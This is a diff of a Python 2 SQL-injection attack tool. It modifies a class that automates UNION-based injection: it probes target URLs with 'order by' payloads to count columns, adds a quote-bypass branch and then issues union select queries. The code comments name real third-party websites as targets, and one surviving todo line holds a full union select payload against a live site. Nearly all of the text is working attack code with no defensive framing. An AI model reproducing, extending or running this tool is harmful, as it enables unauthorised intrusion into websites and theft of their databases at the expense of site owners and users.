@@ -10,7 +10,7 @@ except Exception as err:
     raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s" % (err)) \
                       + TextColor.WHITE
 
-class UnionBaseAttack(object):
+class test_UnionBaseAttack(object):
     def __init__(self, url, injectedChar, firstResponse):
         self.url = url
         self.injectedChar = injectedChar
@@ -19,6 +19,7 @@ class UnionBaseAttack(object):
         self.__StartAttack__()
 
     def __StartAttack__(self):
+        global columns
         injected_method = ""
         orderby_Bypass = False
 
@@ -46,23 +47,50 @@ class UnionBaseAttack(object):
                 orderby_Bypass = True
 
         if orderby_Bypass == True:
+
+            quote_bypass = False
+
             print TextColor.CVIOLET + str('\nPlease wait we must bypass order by injection') + TextColor.WHITE
 
-            #http://www.dailypakistan.pk/e-paper/newsdetail.php?id=9 target
+            secondResponse = lib.requests.get(url=self.url + " order by 1000 --+",
+                                              headers=define_headerdata, verify=False)
+            # if secondResponse.content == self.firstResponse.content:
+            #     quote_bypass = True
+
             #order by injection with bypass %23 todo=something is wrong please check above http site to fix this below codes
             for item in define_order_by_command_php:
-                for counter in xrange(1, 1000):
-                    lib.sleep(.5)
-                    secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --"%(counter),
-                                                      headers=define_headerdata, verify=False)
-                    if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1 or \
-                            secondResponse.content != self.firstResponse.content:
-                        done_str = self.url + item[0:10] + str(counter - 1)
-                        print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
-                        print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
-                        self.__UnionSelectQuery__(counter - 1)
-                        del columns
-                        break
+
+
+                if quote_bypass == False:
+                    for counter in xrange(1, 1000):
+                        lib.sleep(.5)
+                        secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --+"%(counter),
+                                                          headers=define_headerdata, verify=False)
+                        if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1 or \
+                                secondResponse.content != self.firstResponse.content:
+                            done_str = self.url + item[0:10] + str(counter - 1)
+                            print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
+                            print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
+                            self.__UnionSelectQuery__(counter - 1)
+                            del columns
+                            break
+                else:
+                    for counter in xrange(1, 1000):
+                        lib.sleep(.5)
+                        secondResponse = lib.requests.get(url=self.url + "\'" + item[0:10] + "%d --+"%(counter),
+                                                          headers=define_headerdata, verify=False)
+                        for error in define_error_order_by_php:
+                            if secondResponse.content.find(error) is not -1 or \
+                                    secondResponse.content != self.firstResponse.content:
+                                done_str = self.url + item[0:10] + str(counter - 1)
+                                print TextColor.CBEIGE + str(
+                                    "[+] Found => %d columns {%s}" % (counter - 1, done_str)) + TextColor.WHITE
+                                print TextColor.CVIOLET + str(
+                                    "\nNow I testing the union select query ...") + TextColor.WHITE
+                                self.__UnionSelectQuery__(counter - 1)
+                                del columns
+                                break
+
         
 
     def __InjectOrderNumber__ (self, injectedMethod):
@@ -333,9 +361,6 @@ class UnionBaseAttack(object):
 
 
 '''
-    todo: http://www.jazzjournal.co.uk/article.php?id=20%20union%20select%201,concat(QUOTE(11111111111),version(),QUOTE(11111111111)),3,4,5,version(),7,8,9,10,11,12
-    check this target 
-
     todo: http://www.atmarine.fi/index.php?id=-2%20union%20select%201,2,concat(%27hello%27,%20version(),%20%27hello%27),4,5,6,7,8,9,10
     same problem in this two target
     
